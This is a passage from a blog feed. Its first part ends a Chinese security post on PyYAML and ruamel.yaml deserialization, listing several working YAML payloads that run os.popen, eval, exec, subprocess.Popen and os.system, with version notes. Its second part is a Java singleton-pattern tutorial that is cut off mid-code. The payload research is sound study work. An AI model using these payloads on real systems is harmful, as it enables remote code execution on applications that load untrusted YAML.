operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ZeroDivisionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'filter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'map'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zip'</span><span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在就是找可以利用的类了，继续回到我们的constructor.py中，</p><p>进一步审计 construct_python_object_apply()时，存在一个漏洞点</p><p>果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有”{‘extend’:function}”，这样的话，我们就可以利用extend进行任意函数的执行了。</p><p>但是，经过测试，我发现上面 builtins 中的这些类中，只有frozenset,bytes,tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。</p><p>我们接着看 <code>make_python_instance()</code></p><p>这里只要我们的内置类可以执行<code>cls.__new__(cls, *args, **kwds)</code>这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。</p><p>所以猜测frozenset,bytes,tuple应该是可以执行上述代码，所以可以进行命令执行的</p><p>测试payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">frozenset</span>  <span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">map</span>    <span class="token operator">-</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span>os<span class="token punctuation">.</span>popen    <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token string">"bash /app/fileinfo/cmd"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">tuple</span>          <span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">map</span>            <span class="token operator">-</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span><span class="token builtin">eval</span>            <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token string">"print(123)"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再附上一些网上存在的 payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#报错但是执行了</span><span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">str</span>    args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    state<span class="token punctuation">:</span> !!python<span class="token operator">/</span><span class="token builtin">tuple</span>    <span class="token operator">-</span> <span class="token string">"__import__('os').system('whoami')"</span>    <span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">staticmethod</span>      args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>      state<span class="token punctuation">:</span>        update<span class="token punctuation">:</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span><span class="token keyword">exec</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span> !!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>yaml<span class="token punctuation">.</span>MappingNode  listitems<span class="token punctuation">:</span> !!<span class="token builtin">str</span> <span class="token string">'!!python/object/apply:subprocess.Popen [whoami]'</span>  state<span class="token punctuation">:</span>    tag<span class="token punctuation">:</span> !!<span class="token builtin">str</span> dummy    value<span class="token punctuation">:</span> !!<span class="token builtin">str</span> dummy    extend<span class="token punctuation">:</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span>yaml<span class="token punctuation">.</span>unsafe_load<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span>!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span><span class="token builtin">type</span>  args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"z"</span><span class="token punctuation">,</span> !!python<span class="token operator">/</span><span class="token builtin">tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"extend"</span><span class="token punctuation">:</span> !!python<span class="token operator">/</span>name<span class="token punctuation">:</span><span class="token keyword">exec</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  listitems<span class="token punctuation">:</span> <span class="token string">"__import__('os').system('whoami')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PS:</p><p>当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python&#x2F;object&#x2F;apply标签的payload了，别的都可以利用</p><p>上述payload当我测试到5.4b1版本时，发现只有利用<code>针对!!python/name标签</code>的payload可以命令执行，别的payload都不能用了</p><p>当版本大于等于5.3.1：<a class="link"   href="https://github.com/yaml/pyyaml/pull/386" >https://github.com/yaml/pyyaml/pull/386<i class="fas fa-external-link-alt"></i></a></p><p>当版本大于等于6.0： <a class="link"   href="https://github.com/yaml/pyyaml/pull/386" >https://github.com/yaml/pyyaml/pull/386<i class="fas fa-external-link-alt"></i></a></p><h3 id="3-利用ruamel-yaml读写yaml文件"><a href="#3-利用ruamel-yaml读写yaml文件" class="headerlink" title="3. 利用ruamel.yaml读写yaml文件"></a>3. 利用ruamel.yaml读写yaml文件</h3><p>在网上搜资料的时候，Evi1s7 师傅发现了也可以利用 ruamel.yaml 读写 yaml 文件，进行测试一下。</p><p>这里还是沿用 PyYaml&gt;5.1 的 poc</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ruamel<span class="token punctuation">.</span>yamlpoc<span class="token operator">=</span> <span class="token triple-quoted-string string">b"""!!python/object/apply:os.system- calc"""</span>ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然回显报错，但是仍然可以执行，所以利用ruamel.yaml读写yaml文件也是存在上述的漏洞的，这里就不再测试。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>入职后实在是没精力写这些文章了，时间太碎了，后续或许有时间会再回过头来看看</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link"   href="https://xz.aliyun.com/t/12481" >https://xz.aliyun.com/t/12481<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/" >https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Python yaml 反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://drun1baby.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="https://drun1baby.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java 设计模式之单例模式</title>
    <link href="https://drun1baby.github.io/2023/06/01/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>https://drun1baby.github.io/2023/06/01/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</id>
    <published>2023-06-01T01:03:57.000Z</published>
    <updated>2023-06-01T01:05:15.706Z</updated>
    
    <content type="html"><![CDATA[<p>Java 设计模式之单例模式</p><span id="more"></span><h1 id="Java-设计模式之单例模式"><a href="#Java-设计模式之单例模式" class="headerlink" title="Java 设计模式之单例模式"></a>Java 设计模式之单例模式</h1><h2 id="0x01-认识单例模式"><a href="#0x01-认识单例模式" class="headerlink" title="0x01 认识单例模式"></a>0x01 认识单例模式</h2><h3 id="什么是单例模式"><a href="#什么是单例模式" class="headerlink" title="什么是单例模式"></a>什么是单例模式</h3><p>单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得其对象实例的方法（静态方法）。</p><p>比如 <code>Hibernate</code> 类的 <code>SessionFactory</code>，它充当数据存储源的代理，并负责创建 Session 对象。<code>SessionFactory</code> 并不是轻量级的，一般情况下，一个项目通常只需要一个 <code>SessionFactory</code> 就够了，这时就会使用到单例模式。</p><p>单例模式有八种方式如下：</p><pre class="line-numbers language-none"><code class="language-none">1. 饿汉式（静态常量）；2. 饿汉式（静态代码块）；3. 懒汉式（线程不安全）；4. 懒汉式（线程安全，同步方法）；5. 懒汉式（线程安全，同步代码块）；6. 双重检查；7. 静态内部类；8. 枚举<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-八种单例模式详解"><a href="#0x02-八种单例模式详解" class="headerlink" title="0x02 八种单例模式详解"></a>0x02 八种单例模式详解</h2><h3 id="饿汉式（静态常量）"><a href="#饿汉式（静态常量）" class="headerlink" title="饿汉式（静态常量）"></a>饿汉式（静态常量）</h3><p>比较简单，也就是定义一个静态常量，让它成为 <code>new Singleton()</code> 的对象实例</p><p>代码演示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">HungryManStyle</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Singleton</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//饿汉式（静态常量）</span><span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//1、构造器私有化，外部不能 new</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//2、本类内部创建对象实例</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//3、提供一个公有的静态方法，返回实例对象</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>优点：这种写法比较简单，就是在类装载的时候就完成实例化，避免了线程同步问题；</li><li>缺点：在类装载的时候就完成实例化，没有达到懒加载的效果，如果从始至终从未使用过这个实例，则会造成内存的浪费；</li><li>这种方式基于 ClassLoader 机制避免了多线程的同步问题，不过，instance 在类装载时就实例化，在单例模式中大多数都是调用 <code>getInstance()</code> 方法，但是导致类装载的原因有很多种，因此不能确定有其他的方式（或者其他静态方法）导致类加载，这时候初始化 instance 就没有达到懒加载的效果。</li><li>结论：这种单例模式可用，可能造成内存浪费。</li></ul><h3 id="饿汉式（静态代码块）"><a href="#饿汉式（静态代码块）" class="headerlink" title="饿汉式（静态代码块）"></a>饿汉式（静态代码块）</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">HungryManStyle</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Singleton</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//饿汉式（静态代码块）</span><span class="token keyword">class</span> <span class="token class-name">Singleton2</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//1、构造器私有化，外部不能new</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//2、静态代码块</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton2</span> instance<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//3、提供一个公有的静态方法，返回实例对象</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton2</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>这种方式和上面的方式其实类似，只不过将类实例化的过程放在了静态代码块中，也是在类装载的时候，就执行静态代码快中的代码，初始化类的实例。优缺点和上面是一样的。</li><li>结论：这种单例模式可用，但是可能造成内存浪费。</li></ul><h3 id="懒汉式（线程不安全）"><a href="#懒汉式（线程不安全）" class="headerlink" title="懒汉式（线程不安全）"></a>懒汉式（线程不安全）</h3><p><strong>代码演示：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">HungryManStyle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest3</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Singleton</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//懒汉式（线程不安全）  </span><span class="token keyword">class</span> <span class="token class-name">Singleton3</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton3</span> instance<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">Singleton3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//提供一个静态的公有方法，当使用到该方法时，才去创建instance  </span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton3</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> instance<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>解决了线程安全问题；</li><li>效率太低了，每个线程在想获得类的实例的时候，执行getInstance（）方法都要进行同步。而其实这个方法只执行一次实例化代码就够了，后面的想获得该类实例，直接return就行了。方法进行同步效率太低；</li><li>结论：在实际开发中，不推荐使用这种方式。</li></ul><h3 id="懒汉式（线程安全，同步方法）"><a href="#懒汉式（线程安全，同步方法）" class="headerlink" title="懒汉式（线程安全，同步方法）"></a>懒汉式（线程安全，同步方法）</h3><p><strong>代码演示：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Singleton</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//懒汉式（线程安全，同步方法）</span><span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> instance<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//提供一个静态的公有方法，加入同步处理的代码，解决线程安全问题</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token class-name">Singleton</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>优缺点说明：</strong></p><ul><li>解决了线程安全问题；</li><li>效率太低了，每个线程在想获得类的实例的时候，执行getInstance（）方法都要进行同步。而其实这个方法只执行一次实例化代码就够了，后面的想获得该类实例，直接return就行了。方法进行同步效率太低；</li><li>结论：在实际开发中，不推荐使用这种方式。</li></ul><h3 id="懒汉式（线程安全，同步代码块）"><a href="#懒汉式（线程安全，同步代码块）" class="headerlink" title="懒汉式（线程安全，同步代码块）"></a>懒汉式（线程安全，同步代码块）</h3><p><strong>代码演示：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">HungryManStyle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonTest4</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Singleton</span> instance <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Singleton</span> instance2 <span class="token operator">=</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> instance2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//懒汉式（线程安全，同步代码块）  </span><span class="token keyword">class</span> <span class="token class-name">Singleton4</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Singleton4</span> instance<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">Singleton4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton4</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">Singleton4</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> instance<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>说明：</strong></p><ul><li>看似线程安全，但不一定安全。</li><li>结论：不推荐使用。</li></ul><h3 id="双重检查"><a href="#双重检查" class="headerlink" title="双重检查"></a>双重检查</h3><p><strong>代码演示：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token 